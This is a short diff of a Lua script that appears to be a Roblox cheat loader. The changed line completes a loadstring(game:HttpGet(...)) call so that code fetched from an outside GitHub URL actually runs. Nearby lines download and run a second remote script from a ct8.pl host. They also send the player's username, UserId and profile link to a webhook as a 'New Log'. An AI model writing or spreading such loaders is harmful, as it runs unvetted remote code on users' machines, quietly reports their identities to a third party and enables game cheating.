@@ -42,7 +42,7 @@ local username = game.Players.LocalPlayer.Name
 local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()
 if players[username] == true then
 	print("loading assware for " .. username)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/v3gui.lua")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/v3gui.lua")()
 	SendMessage(url, "# Whitelisted! \n<@&1160824224840163338> New Log!\n`" .. game.Players.LocalPlayer.Name .. "` has executed with whitelist! \nUserId: **" .. game.Players.LocalPlayer.UserId .. "**\n\nLink: https://roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")
 else
 											
